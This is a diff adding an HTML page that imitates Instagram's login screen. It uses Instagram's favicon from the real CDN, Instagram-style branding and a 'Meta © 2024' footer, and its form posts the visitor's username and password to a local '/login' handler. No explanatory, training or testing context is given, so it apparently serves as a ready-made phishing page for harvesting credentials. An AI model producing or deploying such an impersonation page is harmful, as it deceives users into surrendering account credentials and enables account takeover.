@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Instagram</title>
+<link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+@keyframes fadeInUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+@keyframes gradientShift{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
+@keyframes borderGlow{0%,100%{border-color:#dbdbdb}50%{border-color:#c7c7c7}}
+@keyframes scaleIn{from{opacity:0;transform:scale(0.9)}to{opacity:1;transform:scale(1)}}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(45deg,#fafafa,#f0f0f0,#fafafa);background-size:200% 200%;animation:gradientShift 6s ease infinite;display:flex;align-items:center;justify-content:center;min-height:100vh}
+.wrapper{display:flex;gap:32px;align-items:center}
+.right{width:350px;animation:fadeInUp 0.8s cubic-bezier(0.16,1,0.3,1)}
+.login-box{background:white;border:1px solid #dbdbdb;border-radius:4px;padding:40px 40px 20px;margin-bottom:10px;text-align:center;animation:scaleIn 0.6s ease 0.2s both}
+.logo-text{font-family:'Segoe Script','Dancing Script',cursive;font-size:42px;margin-bottom:28px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;animation:fadeIn 1s ease 0.4s both}
+.login-box form input{width:100%;padding:12px 10px;margin:5px 0;border:1px solid #dbdbdb;border-radius:4px;font-size:13px;background:#fafafa;outline:none;transition:all 0.3s}
+.login-box form input:focus{border-color:#a8a8a8;background:white;box-shadow:0 0 0 2px rgba(0,0,0,0.05)}
+.login-btn{width:100%;padding:9px;background:linear-gradient(45deg,#4cb5f9,#0095f6);color:white;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;margin-top:14px;transition:all 0.3s;opacity:0.9}
+.login-btn:hover{opacity:1;box-shadow:0 4px 12px rgba(0,149,246,0.3);transform:translateY(-1px)}
+.divider{display:flex;align-items:center;margin:18px 0}
+.divider::before,.divider::after{content:'';flex:1;height:1px;background:#dbdbdb}
+.divider span{padding:0 16px;color:#8e8e8e;font-size:13px;font-weight:600}
+.fb-login{color:#385185;font-size:14px;font-weight:600;text-decoration:none;display:flex;align-items:center;justify-content:center;gap:8px}
+.forgot{color:#00376b;font-size:12px;text-decoration:none;display:block;margin-top:16px;transition:color 0.2s}
+.forgot:hover{color:#001d38}
+.signup-box{background:white;border:1px solid #dbdbdb;padding:22px 40px;text-align:center;font-size:14px;color:#262626;animation:fadeInUp 0.6s ease 0.4s both;border-radius:4px}
+.signup-box a{color:#0095f6;font-weight:600;text-decoration:none}
+.footer{position:fixed;bottom:0;width:100%;text-align:center;padding:20px;font-size:11px;color:#8e8e8e;animation:fadeIn 0.6s ease 0.8s both}
+@media(max-width:768px){.wrapper{flex-direction:column}.right{width:100%;max-width:350px}}
+</style>
+</head>
+<body>
+<div class="wrapper">
+    <div class="right">
+        <div class="login-box">
+            <h1 class="logo-text">Instagram</h1>
+            <form action="/login" method="POST">
+                <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit" class="login-btn">Log in</button>
+            </form>
+            <div class="divider"><span>OR</span></div>
+            <a href="#" class="fb-login">🔵 Log in with Facebook</a>
+            <a href="#" class="forgot">Forgot password?</a>
+        </div>
+        <div class="signup-box">Don't have an account? <a href="#">Sign up</a></div>
+    </div>
+</div>
+<div class="footer">Meta © 2024 · About · Blog · Jobs · Help · API · Privacy · Terms</div>
+</body>
+</html>
